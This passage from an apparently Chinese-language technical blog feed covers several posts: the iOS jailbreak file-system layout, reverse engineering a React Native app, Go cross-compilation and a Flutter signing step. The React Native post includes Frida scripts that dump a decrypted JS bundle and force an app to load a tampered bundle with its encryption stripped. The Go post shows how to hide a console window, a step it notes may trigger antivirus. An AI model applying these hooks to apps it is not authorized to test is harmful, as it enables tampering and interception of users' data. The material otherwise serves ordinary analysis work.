class="hljs-symbol">demo:</span>(id)arg1 &#123; %log; %orig; &#125;</span><br><span class="ruby"></span><span class="hljs-tag"> </span><br><span class="hljs-tag">%<span class="hljs-selector-tag">end</span></span><br><br></code></pre></td></tr></table></figure><p>将生成的Tweak.x文件替换theos生成的Tweak.x文件后编译安装即可</p><p>查看打印日志</p> <img src="/2021/08/22/iOS-Tweak/images/logify.png" class="">]]></content>
    
    
    <categories>
      
      <category>iOS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hook</tag>
      
      <tag>iOS</tag>
      
      <tag>tweak</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IOS文件结构</title>
    <link href="/2021/08/22/IOS%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/"/>
    <url>/2021/08/22/IOS%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><p>目录结构</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs coq">/<br>|<br><span class="hljs-type">---Developer</span>/<br>|<br><span class="hljs-type">---Applications</span>/<br>|<br><span class="hljs-type">---Library</span>/<br>|<br><span class="hljs-type">---System</span>/<br>|<br><span class="hljs-type">---bin</span>/<br>|<br><span class="hljs-type">---sbin</span>/<br>|<br><span class="hljs-type">---boot</span>/<br>|<br><span class="hljs-type">---cores</span>/<br>|<br><span class="hljs-type">---dev</span>/<br>|<br><span class="hljs-type">---usr</span>/<br>|<br><span class="hljs-type">---lib</span>/<br>|<br><span class="hljs-type">---mnt</span>/<br>|<br><span class="hljs-type">---tmp</span> -&gt; private/var/tmp/<br>|<br><span class="hljs-type">---etc</span> -&gt; private/etc/<br>|<br><span class="hljs-type">---User</span> -&gt; /var/mobile/<br>|<br><span class="hljs-type">---var</span> -&gt; private/var/<br>|<br><span class="hljs-type">---private</span>/<br></code></pre></td></tr></table></figure><h2 id="根目录"><a href="#根目录" class="headerlink" title="根目录"></a>根目录</h2><h3 id="1-Developer"><a href="#1-Developer" class="headerlink" title="1. /Developer"></a>1. /Developer</h3><pre><code>开发者相关库、工具</code></pre><h3 id="2-Applications"><a href="#2-Applications" class="headerlink" title="2. /Applications"></a>2. /Applications</h3><pre><code>系统APP</code></pre><h3 id="3-Library"><a href="#3-Library" class="headerlink" title="3. /Library"></a>3. /Library</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">用户缓存数据<br></code></pre></td></tr></table></figure><p>越狱相关文件会存放该目录下</p><p>3.1 /Library/dpkg <code>cydia dpkg目录</code></p><pre><code>安装插件使用的文件路径、插件卸载脚本、插件签名/var/lib/dpkg/infoinfo|--- re.frida.server.list 所使用的文件|--- re.frida.server.md5sums 签名|--- re.frida.server.prerm 卸载脚本</code></pre><p>3.2 /Library/LaunchDaemons  <code>越狱后添加后台运行程序,以plist文件形式存放</code></p><p>3.3 /Library/MobileSubstrate <code>越狱插件相关目录</code></p><pre><code>/Library/MobileSubstrate/DynamicLibraries 越狱插件安装目录,结构如下DynamicLibraries |---inject.plist|---inject.dylibplist文件中包含要hook的app或组件的信息，cydia负责将对应的dylib加载到hook的进程中</code></pre><p> 3.4 /Library/PreferenceBundles <code>越狱插件的界面，如FlyJB会在设置中有个设置界面，对应该目录下的资源文件,注:要想使用界面功能需要先安装P  referenceLoader插件</code></p><p> 3.5 /Library/PreferenceLoader/Preferences <code>越狱插件的用户偏好设置</code></p><p> 3.6 /Library/Ringtones <code>系自带的来电铃声存放目录(ACC文件结构)</code></p><h3 id="4-System"><a href="#4-System" class="headerlink" title="4.  /System"></a>4.  /System</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">系统缓存数据、库文件<br></code></pre></td></tr></table></figure><p>4.1 /System/Library/LaunchDaemons</p><pre><code>设置系统守护进程目录，plist文件设置</code></pre><p>4.1 /System/Library/Frameworks   /System/Library/PrivateFrameworks</p><pre><code>系统动态库</code></pre><h3 id="5-bin-sbin"><a href="#5-bin-sbin" class="headerlink" title="5. /bin  /sbin"></a>5. /bin  /sbin</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">命令<br></code></pre></td></tr></table></figure><h3 id="6-boot"><a href="#6-boot" class="headerlink" title="6. /boot"></a>6. /boot</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">引导相关，该文件夹为空<br></code></pre></td></tr></table></figure><h3 id="7-dev"><a href="#7-dev" class="headerlink" title="7. /dev"></a>7. /dev</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">设备文件<br></code></pre></td></tr></table></figure><h3 id="8-usr"><a href="#8-usr" class="headerlink" title="8. /usr"></a>8. /usr</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">系统核心库、命令<br></code></pre></td></tr></table></figure><p>8.1  /usr/lib/substrate <code>越狱核心库文件</code></p><pre><code>substrate|--- SubstrateBootstrap.dylib|--- SubstrateInserter.dylib|--- SubstrateLoader.dylib运行APP会加载3个dylib</code></pre><h3 id="9-tmp"><a href="#9-tmp" class="headerlink" title="9. /tmp"></a>9. /tmp</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">软连接到 <span class="hljs-regexp">/private/</span>tmp/<br></code></pre></td></tr></table></figure><h3 id="10-etc"><a href="#10-etc" class="headerlink" title="10. /etc"></a>10. /etc</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">软连接到 <span class="hljs-regexp">/private/</span>etc/<br></code></pre></td></tr></table></figure><h3 id="11-User"><a href="#11-User" class="headerlink" title="11. /User"></a>11. /User</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">软件接到 <span class="hljs-regexp">/var/m</span>obile/<br></code></pre></td></tr></table></figure><h3 id="12-var"><a href="#12-var" class="headerlink" title="12. /var"></a>12. /var</h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">软件接到 <span class="hljs-keyword">private</span>/<span class="hljs-keyword">var</span><br></code></pre></td></tr></table></figure><h3 id="13-private"><a href="#13-private" class="headerlink" title="13. /private"></a>13. /private</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">核心文件系统<br></code></pre></td></tr></table></figure><p>13.1 /private/etc <code>配置文件</code></p><p>13.2 /private/system_data <code>空文件夹</code></p><p>13.3 /private/xarts <code>unknow</code></p><p>13.4 /private/var</p><pre><code>系统核心目录，root、mobile家目录、app安装目录、用户数据、存储.........都在该目录下</code></pre><h2 id="private-var目录"><a href="#private-var目录" class="headerlink" title="/private/var目录"></a>/private/var目录</h2><h3 id="1-Keychains"><a href="#1-Keychains" class="headerlink" title="1. Keychains"></a>1. Keychains</h3><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">Keychains</span> 加密后数据<br></code></pre></td></tr></table></figure><p>   1.1  /var/Keychains/keychain-2.db</p><pre><code>存放加密后数据</code></pre><p>1.2 /var/Keychains/TrustStore.sqlite3</p><pre><code>导入证书数据</code></pre><h3 id="2-MobileDevice"><a href="#2-MobileDevice" class="headerlink" title="2. MobileDevice"></a>2. MobileDevice</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">描述文件<br></code></pre></td></tr></table></figure><p>2.1 /var/MobileDevice/ProvisioningProfiles</p><pre><code>安装的描述文件</code></pre><h3 id="3-MobileSoftwareUpdate"><a href="#3-MobileSoftwareUpdate" class="headerlink" title="3. MobileSoftwareUpdate"></a>3. MobileSoftwareUpdate</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">系统升级相关<br></code></pre></td></tr></table></figure><h3 id="4-binpack"><a href="#4-binpack" class="headerlink" title="4. binpack"></a>4. binpack</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">checkra</span>越狱后的checkra<span class="hljs-number">1</span>n APP安装目录<br></code></pre></td></tr></table></figure><h3 id="5-cache"><a href="#5-cache" class="headerlink" title="5. cache"></a>5. cache</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">缓存目录，apt会缓存数据到该目录<br></code></pre></td></tr></table></figure><h3 id="6-containers"><a href="#6-containers" class="headerlink" title="6. containers"></a>6. containers</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">用户<span class="hljs-keyword">APP</span>安装目录、共享数据<br></code></pre></td></tr></table></figure><p>6.1 /var/containers/Bundle/Application</p><pre><code>用户APP安装目录</code></pre><p>6.2 /var/containers/Shared</p><pre><code>    APP共享数据目录</code></pre><h3 id="7-db"><a href="#7-db" class="headerlink" title="7. db"></a>7. db</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">系统文件，铃声，壁纸，系统设置，界面，ui<br></code></pre></td></tr></table></figure><h3 id="8-installd"><a href="#8-installd" class="headerlink" title="8. installd"></a>8. installd</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">安装APP，安装APP时可能会先缓存到<span class="hljs-regexp">/var/i</span>nstalld<span class="hljs-regexp">/Library/</span>Caches/com.apple.mobile.installd.staging<br></code></pre></td></tr></table></figure><h3 id="9-keybags"><a href="#9-keybags" class="headerlink" title="9. keybags"></a>9. keybags</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">锁屏密码相关<br></code></pre></td></tr></table></figure><h3 id="10-lib"><a href="#10-lib" class="headerlink" title="10. lib"></a>10. lib</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">cydia相关文件<br></code></pre></td></tr></table></figure><p>10.1 /var/lib/apt <code>apt相关文件</code></p><p>10.2 /var/lib/cydia/firmware.ver <code>cydia版本</code></p><p>10.3 /var/lib/dpkg <code>软链接到/Library/dpkg</code></p><h3 id="11-log-logs"><a href="#11-log-logs" class="headerlink" title="11. log logs"></a>11. log logs</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">日志相关<br></code></pre></td></tr></table></figure><h3 id="12-networkd"><a href="#12-networkd" class="headerlink" title="12. networkd"></a>12. networkd</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">网络相关<br></code></pre></td></tr></table></figure><h3 id="13-preferences"><a href="#13-preferences" class="headerlink" title="13. preferences"></a>13. preferences</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">偏好设置<br></code></pre></td></tr></table></figure><h3 id="14-run"><a href="#14-run" class="headerlink" title="14. run"></a>14. run</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">UNKNOW</span><br></code></pre></td></tr></table></figure><h3 id="15-vm"><a href="#15-vm" class="headerlink" title="15. vm"></a>15. vm</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">虚拟内存<br></code></pre></td></tr></table></figure><h3 id="16-wireless"><a href="#16-wireless" class="headerlink" title="16. wireless"></a>16. wireless</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">UNKNOW</span><br></code></pre></td></tr></table></figure><h3 id="17-tmp"><a href="#17-tmp" class="headerlink" title="17. tmp"></a>17. tmp</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">临时文件<br></code></pre></td></tr></table></figure><h3 id="18-root"><a href="#18-root" class="headerlink" title="18. root"></a>18. root</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">root用户家目录<br></code></pre></td></tr></table></figure><h3 id="19-mobile"><a href="#19-mobile" class="headerlink" title="19. mobile"></a>19. mobile</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">mobile用户家目录<br></code></pre></td></tr></table></figure><p>19.1 Documents <code>mobile用户文档,CrackerXI会脱壳到该目录下</code></p><p>19.2 Media <code>相册、电子书、录音等</code></p><pre><code>相册照片/var/mobile/Media/DCIMiTunes上传的多媒体文件目录/var/mobile/Media/iTunes_Control照片里的图片/var/mobile/Media/Photos语音备忘录/var/mobile/Media/Recordings</code></pre><p>​    </p><p>19.3 Library <code>mobile用户缓存数据</code></p><pre><code>APP安装后生成的安装路径、沙箱目录名称 会存储在该DB/var/mobile/Library/FrontBoard/applicationState.db存储通讯录/var/mobile/Library/AddressBook存储短信/var/mobile/Library/SMS存储备忘录/var/mobile/Library//var/mobile/Library</code></pre><p>19.4 Containers <code>APP沙箱、共享数据等</code></p><pre><code>APP沙箱目录/var/mobile/Containers/Data/Application/xxxxAPP沙箱目录|--- Documents 文档目录,存储一些文件|--- Library 缓存数据|   ||   --- Caches 缓存|   ||   --- Preferences 用户偏好设置，一般该目录下会存在.plist|   | |   --- Cookies 使用WebKit时cookie存储路径|   ||   --- WebKit/WebsiteData  H5本地缓存数据、IndexedDB、WebSQL等|   ||   --- SplashBoard/Snapshots 挂起快照,启动图缓存|   ||   --- .....|--- SystemData APP运行产生的数据一般很少使用|--- tmp  临时文件</code></pre><p>​    </p>]]></content>
    
    
    <categories>
      
      <category>iOS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>iOS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ReactNative分析</title>
    <link href="/2021/08/22/ReactNative%E5%88%86%E6%9E%90/"/>
    <url>/2021/08/22/ReactNative%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>React Native (简称RN)是Facebook于2015年4月开源的跨平台移动应用开发框架，是Facebook早先开源的JS框架 React 在原生移动应用平台的衍生产物，支持iOS和安卓两大平台</p><h2 id="2-分析"><a href="#2-分析" class="headerlink" title="2. 分析"></a>2. 分析</h2><p>核心代码为js编写，在安装包assest目录下存放index.android.bundle（有可能重命名，因为rn本身仅仅做了混淆，使用编辑器打开即可分析js代码。</p><p>注：部分APP可能会将index.android.bundle加密，运行时解密加载</p><h3 id="2-1-数据解密"><a href="#2-1-数据解密" class="headerlink" title="2.1 数据解密"></a>2.1 数据解密</h3><h4 id="2-1-1-通过请求包关键字定位到加密点"><a href="#2-1-1-通过请求包关键字定位到加密点" class="headerlink" title="2.1.1 通过请求包关键字定位到加密点"></a>2.1.1 通过请求包关键字定位到加密点</h4> <img src="/2021/08/22/ReactNative%E5%88%86%E6%9E%90/images/%E5%AE%9A%E4%BD%8D%E5%88%B0%E5%8A%A0%E5%AF%86%E7%82%B9.png" class=""><h4 id="2-1-2-新建js文件，复制strEnc、strDec方法和相关依赖方法，并使用node运行解密"><a href="#2-1-2-新建js文件，复制strEnc、strDec方法和相关依赖方法，并使用node运行解密" class="headerlink" title="2.1.2 新建js文件，复制strEnc、strDec方法和相关依赖方法，并使用node运行解密"></a>2.1.2 新建js文件，复制strEnc、strDec方法和相关依赖方法，并使用node运行解密</h4> <img src="/2021/08/22/ReactNative%E5%88%86%E6%9E%90/images/node%E5%AE%9E%E7%8E%B0%E5%8A%A0%E8%A7%A3%E5%AF%86.png" class=""><h4 id="2-1-3编写burp插件，java调用js加解密方法"><a href="#2-1-3编写burp插件，java调用js加解密方法" class="headerlink" title="2.1.3编写burp插件，java调用js加解密方法"></a>2.1.3编写burp插件，java调用js加解密方法</h4><p>TODO</p><h3 id="2-2-bundle代码篡改"><a href="#2-2-bundle代码篡改" class="headerlink" title="2.2 bundle代码篡改"></a>2.2 bundle代码篡改</h3><p>对于非对称加密需要将bundle中的公钥进行替换，所以需要对bundle进行篡改。<br>index.android.bundle中的js最终是需要被load到内存中，所以在某一时刻是可以获取，将load前的index.android.bundle进行篡改。</p><h4 id="2-2-1-分析rn加载流程"><a href="#2-2-1-分析rn加载流程" class="headerlink" title="2.2.1 分析rn加载流程"></a>2.2.1 分析rn加载流程</h4><p><strong>com.facebook.react.ReactNativeHost.createReactInstanceManager</strong>方法</p><img src="/2021/08/22/ReactNative%E5%88%86%E6%9E%90/images/createReactInstanceManager.png" class=""><p>如上图 <strong>小1</strong> 由用户指定bundle路径，一般来说如果bundle加密了，解密后会将jSBundleFile设置为bundle解密后文件路径，由RN负责加载，此时可以HOOK该方法，进行解密后的bundle dump。</p><p>进入<strong>jSBundleFile</strong>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ReactInstanceManagerBuilder <span class="hljs-title">setJSBundleFile</span><span class="hljs-params">(String str)</span> </span>&#123;<br><br>    <span class="hljs-keyword">if</span> (!str.startsWith(<span class="hljs-string">&quot;assets://&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span> setJSBundleLoader(JSBundleLoader.createFileLoader(str));<br>    &#125;<br>    <span class="hljs-keyword">this</span>.mJSBundleAssetUrl = str;<br>    <span class="hljs-keyword">this</span>.mJSBundleLoader = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>  解密后的文件路径固然不能是assets开头的，所以会走setJSBundleLoader流程</p><p>  dump bundle脚本，获取到bundle文件后即可进行篡改</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> ReactInstanceManagerBuilder = Java.use(<span class="hljs-string">&quot;com.facebook.react.ReactInstanceManagerBuilder&quot;</span>);<br>ReactInstanceManagerBuilder.setJSBundleFile.overload(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">path</span>) </span>&#123;<br>   <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;bundle path is :&quot;</span>,path);<br>    <span class="hljs-keyword">return</span>  <span class="hljs-built_in">this</span>.setJSBundleFile(path);<br>&#125;;<br></code></pre></td></tr></table></figure><p>如上图 <strong>小2</strong> 如果用户未指定jSBundleFile，则默认调用setBundleAssetName方法，如下图会加载assets路径下的<strong>index.android.bundle</strong>(这也是为什么app资源路径下bundle默认名为index.android.bundle的原因)</p><img src="/2021/08/22/ReactNative%E5%88%86%E6%9E%90/images/setBundleAssetName.png" class=""><h4 id="2-2-2-篡改bundle"><a href="#2-2-2-篡改bundle" class="headerlink" title="2.2.2 篡改bundle"></a>2.2.2 篡改bundle</h4><h5 id="2-2-2-1-将index-android-bundle中的加密方法删除"><a href="#2-2-2-1-将index-android-bundle中的加密方法删除" class="headerlink" title="2.2.2.1 将index.android.bundle中的加密方法删除"></a>2.2.2.1 将index.android.bundle中的加密方法删除</h5><img src="/2021/08/22/ReactNative%E5%88%86%E6%9E%90/images/%E7%AF%A1%E6%94%B9bundle.png" class=""><h5 id="2-2-2-2-push至手机sd卡下"><a href="#2-2-2-2-push至手机sd卡下" class="headerlink" title="2.2.2.2 push至手机sd卡下"></a>2.2.2.2 push至手机sd卡下</h5><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">adb</span> <span class="hljs-keyword">push</span> xxxx /sdcard<br></code></pre></td></tr></table></figure><h5 id="2-2-2-3-HOOK-setBundleAssetName，load修改后bundle"><a href="#2-2-2-3-HOOK-setBundleAssetName，load修改后bundle" class="headerlink" title="2.2.2.3 HOOK setBundleAssetName，load修改后bundle"></a>2.2.2.3 HOOK setBundleAssetName，load修改后bundle</h5><p>因为setBundleAssetName方法会对当前入参路径拼接assets://，所以在该方法下不能简单的HOOK修改入参（bundle路径），故HOOK该方法，篡改代码逻辑，强制走上面分析中的<strong>小1</strong>流程</p><p>frida hook脚本如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> ReactInstanceManagerBuilder = Java.use(<span class="hljs-string">&quot;com.facebook.react.ReactInstanceManagerBuilder&quot;</span>);<br><span class="hljs-keyword">var</span> JSBundleLoader = Java.use(<span class="hljs-string">&quot;com.facebook.react.bridge.JSBundleLoader&quot;</span>)<br>ReactInstanceManagerBuilder.setBundleAssetName.overload(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>).implementation = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">path</span>) </span>&#123;<br><br>    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;bundle path is :&quot;</span>,path);<br>    <span class="hljs-keyword">var</span> newPath = <span class="hljs-string">&quot;/storage/emulated/0/index.android.bundle&quot;</span>;<br>   <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.setJSBundleLoader(JSBundleLoader.$new().createFileLoader(newPath));<br>&#125;;<br></code></pre></td></tr></table></figure><p>burp抓包未篡改js与篡改js后请求包对比</p><p>未篡改，数据已加密</p><img src="/2021/08/22/ReactNative%E5%88%86%E6%9E%90/images/%E5%8A%A0%E5%AF%86.png" class=""><p>篡改后，明文</p><img src="/2021/08/22/ReactNative%E5%88%86%E6%9E%90/images/%E8%A7%A3%E5%AF%86.png" class="">]]></content>
    
    
    <categories>
      
      <category>ReactNative</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hook</tag>
      
      <tag>ReactNative</tag>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>go交叉编译</title>
    <link href="/2021/08/22/go%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/"/>
    <url>/2021/08/22/go%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91/</url>
    
    <content type="html"><![CDATA[<h2 id="查看支持架构"><a href="#查看支持架构" class="headerlink" title="查看支持架构"></a>查看支持架构</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">go tool dist list</span><br></code></pre></td></tr></table></figure><h2 id="交叉编译"><a href="#交叉编译" class="headerlink" title="交叉编译"></a>交叉编译</h2><p>Linux elf</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">GOOS</span>=linux <span class="hljs-attribute">GOARCH</span>=amd64 go build hello.go<br></code></pre></td></tr></table></figure><p>arm架构</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">GOARM</span>=7 <span class="hljs-attribute">GOARCH</span>=arm <span class="hljs-attribute">GOOS</span>=linux go build<br></code></pre></td></tr></table></figure><p>其中-w为去掉调试信息，-s为去掉符号表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs GOOS">GOOS=linux GOARCH=mips64  go build -ldflags &quot;-s -w&quot; main.go<br></code></pre></td></tr></table></figure><p>参数解析</p><p>GOOS：目标操作系统<br>GOARCH：目标操作系统的架构</p><table><thead><tr><th>OS</th><th>ARCH</th><th>OS version</th></tr></thead><tbody><tr><td>linux</td><td>386 / amd64 / arm</td><td>&gt;= Linux 2.6</td></tr><tr><td>darwin</td><td>386 / amd64</td><td>OS X (Snow Leopard + Lion)</td></tr><tr><td>freebsd</td><td>386 / amd64</td><td>&gt;= FreeBSD 7</td></tr><tr><td>windows</td><td>386 / amd64</td><td>&gt;= Windows 2000</td></tr></tbody></table><h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><p> 在网络上的诸多教程中可能会看到下面的编译命令</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">CGO_ENABLED</span>=0 <span class="hljs-attribute">GOOS</span>=linux <span class="hljs-attribute">GOARCH</span>=amd64 go build hello.go<br></code></pre></td></tr></table></figure><p>其中CGO_ENABLED=0的意思是使用C语言版本的GO编译器，</p><p>参数配置为0的时候就关闭C语言版本的编译器了。</p><p>自从golang1.5以后go就使用go语言编译器进行编译了。</p><p>在golang1.9当中没有使用CGO_ENABLED参数发现依然可以正常编译。当然使用了也可以正常编译。</p><p>比如把CGO_ENABLED参数设置成1，即在编译的过程当中使用CGO编译器，我发现依然是可以正常编译的。</p><p>实际上如果在go当中使用了C的库，</p><p>比如import “C”默认使用go build的时候就会启动CGO编译器，当然我们可以使用CGO_ENABLED=0来控制go build是否使用CGO编译器。</p><h3 id="隐藏cmd"><a href="#隐藏cmd" class="headerlink" title="隐藏cmd"></a>隐藏cmd</h3><ol><li>通过ldflags，可能会报毒</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> build -ldflags=<span class="hljs-string">&quot;-H windowsgui&quot;</span>  xxx.<span class="hljs-keyword">go</span> <br></code></pre></td></tr></table></figure><ol start="2"><li>运行时通过代码实现隐藏</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;github.com/lxn/win&quot;</span><br><br>win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)<br></code></pre></td></tr></table></figure><h3 id="去掉符号信息"><a href="#去掉符号信息" class="headerlink" title="去掉符号信息"></a>去掉符号信息</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> build -ldflags <span class="hljs-string">&quot;-s -w&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>go</category>
      
    </categories>
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>flutter编译release版本</title>
    <link href="/2021/08/22/flutter%E7%BC%96%E8%AF%91release%E7%89%88%E6%9C%AC/"/>
    <url>/2021/08/22/flutter%E7%BC%96%E8%AF%91release%E7%89%88%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h2 id="1-生成jks"><a href="#1-生成jks" class="headerlink" title="1. 生成jks"></a>1. 生成jks</h2><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">keytool -genkey -v -keystore ~/<span class="hljs-built_in">key</span>.jks -keyalg RSA -keysize <span class="hljs-number">2048</span> -validity <span class="hljs-number">10000</span> -<span class="hljs-built_in">alias</span> <span class="hljs-built_in">key</span><br></code></pre></td></tr></table></figure><h2 id="2-创建key-properities"><a href="#2-创建key-properities" class="headerlink" title="2. 创建key.properities"></a>2. 创建key.properities</h2><p>flutter-project/android下创建key.properities</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">storePassword</span> = <span 